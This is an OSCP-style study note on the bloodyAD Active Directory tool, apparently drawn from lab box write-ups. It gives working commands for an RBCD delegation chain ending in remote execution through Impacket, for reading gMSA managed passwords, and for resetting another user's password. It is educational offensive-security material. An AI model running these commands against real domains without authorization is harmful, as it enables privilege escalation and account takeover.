# BloodyAD

`bloodyAD` is a focused Active Directory abuse tool for performing object and ACL operations from Kali. In RockyColt it constructed the binary security descriptor required for Resource-Based Constrained Delegation (RBCD), which avoided manually encoding `msDS-AllowedToActOnBehalfOfOtherIdentity`.

Cross-links: [[22. Active Directory Introduction and Enumeration|AD]], [[RUNBOOK V2/AD - Resource-Based Constrained Delegation|RUNBOOK V2 RBCD]], [[OSCP/COMMAND BREAKDOWNS/Active Directory (Breakdowns)#RockyColt: RBCD and the S4U chain|RBCD breakdown]], [[OSCP/DECISION TREE/Active Directory (Decision Tree)|AD Decision Tree]]

## What problem it solves

Raw LDAP writes are awkward when an attribute contains a binary security descriptor rather than a normal string. `bloodyAD add rbcd` resolves the controlled machine account and builds the descriptor for the target computer. It is also useful for other deliberate AD object and permission operations, but each action should be confirmed in BloodHound or LDAP before and after the change.

## Install

Use the current project installation method documented by the upstream project. On Kali, a `pipx` installation keeps the tool isolated from system Python packages:

```bash
pipx install bloodyAD
bloodyAD --help
```

## RockyColt RBCD workflow

```bash
# Add the controlled machine account to the target computer's RBCD descriptor.
bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP \
  add rbcd $TargetComputer $MachineAccount

# Remove the temporary delegation after verification.
bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP \
  remove rbcd $TargetComputer $MachineAccount
```

Then request and use the service ticket with Impacket:

```bash
getST.py -spn "cifs/$FQDN" \
  -impersonate $AdminUser \
  -dc-ip $BoxIP \
  "$Domain/$MachineAccount" \
  -hashes ":$NThash"

KRB5CCNAME=$BoxDir/loot/$AdminUser.ccache \
  wmiexec.py -k -no-pass $FQDN
```

The exact host option differs between releases. If `--host` is rejected, run `bloodyAD --help` and use the release's equivalent host option. The account passed to `add rbcd` is the controlled machine account, while the first account is the principal allowed to modify the target computer object.

## Why the generic write failed

`msDS-AllowedToActOnBehalfOfOtherIdentity` is a binary Windows security descriptor. Passing an account name through a generic `set object` value option does not create a valid descriptor. `bloodyAD add rbcd` is the safer abstraction because it resolves the account SID and writes the descriptor in the required format.

## Efficiency and verification

- Use BloodHound first to confirm that the modifying account can write the target computer object.
- Recover the controlled computer account's NT hash from the matching local hives or another authorized source before starting the ticket step.
- Request the ticket for the service you will actually use. `cifs/$FQDN` is a practical choice when the final client is WMI, SMB, or another Windows remote-management path.
- Resolve the target FQDN locally before using the ccache. A valid Kerberos ticket does not repair missing DNS or `/etc/hosts` entries.
- Remove the RBCD entry after the proof is captured and confirm the tool reports that the machine account is no longer trusted for delegation.

## Vintage: Kerberos cache and group-based RBCD

Vintage used `bloodyAD` for normal LDAP object changes through a ccache rather than an NTLM password:

```bash
KRB5_CONFIG=$BoxDir/notes/krb5.conf \
KRB5CCNAME=$BoxDir/loot/gMSA01$.ccache \
  bloodyAD -d $Domain -u 'gMSA01$' \
  -k ccache=$BoxDir/loot/gMSA01$.ccache kdc=$BoxIP \
  -H $FQDN -i $BoxIP get object 'gMSA01$' \
  --attr msDS-ManagedPassword --raw
```

When a trusted RBCD group already exists on the target computer, add the controlled machine account to the group and verify it instead of writing the binary RBCD attribute directly:

```bash
bloodyAD -d $Domain -u $Username3 -k \
  ccache=$BoxDir/loot/$Username3.ccache kdc=$BoxIP \
  -H $FQDN -i $BoxIP \
  add groupMember DelegatedAdmins 'FS01$'

bloodyAD -d $Domain -u $Username3 -k \
  ccache=$BoxDir/loot/$Username3.ccache kdc=$BoxIP \
  -H $FQDN -i $BoxIP \
  get object DelegatedAdmins --attr member
```

Renew the `FS01$` TGT after the membership change. Vintage's first `getST.py` attempts failed with `KDC_ERR_BADOPTION` until group membership, `tokenGroups`, and the machine ticket were all refreshed.

#### Tags: #ModernTooling #BloodyAD #ActiveDirectory #RBCD #ACLAbuse #Kerberos #S4U #Delegation

## External Resources

- [BloodyAD project](https://github.com/CravateRouge/bloodyAD)
- [iRed Team - Resource-Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)

## Why this matters for OSCP

BloodyAD speeds up a specific AD object-abuse operation without hiding the underlying permission model. Understand the object right, security descriptor, service ticket, and cleanup before relying on the command.

## Related RUNBOOK V2 stage

- [[RUNBOOK V2/AD - Resource-Based Constrained Delegation]]

## Search: gMSA delegated password reset

Search used a gMSA NT hash for an authenticated directory operation rather than treating the hash as a direct administrator credential:

~~~bash
netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHash
bloodyAD -d $Domain -u 'BIR-ADFS-GMSA$' -p :$GmsaHash \
  --host $BoxIP set password Tristan.Davies $TemporaryPassword
netexec smb $BoxIP -u Tristan.Davies -p $TemporaryPassword
~~~

The important evidence is the exact object-right relationship, BloodyAD success output, and the subsequent Pwn3d! validation. Record and restore the target password where possible; Search's manual transcript records the change but not a restoration.

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- RBCD from a controlled member computer to the domain controller
- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- gMSA object reads, ccache-backed group changes, and group-based RBCD with `FS01$`
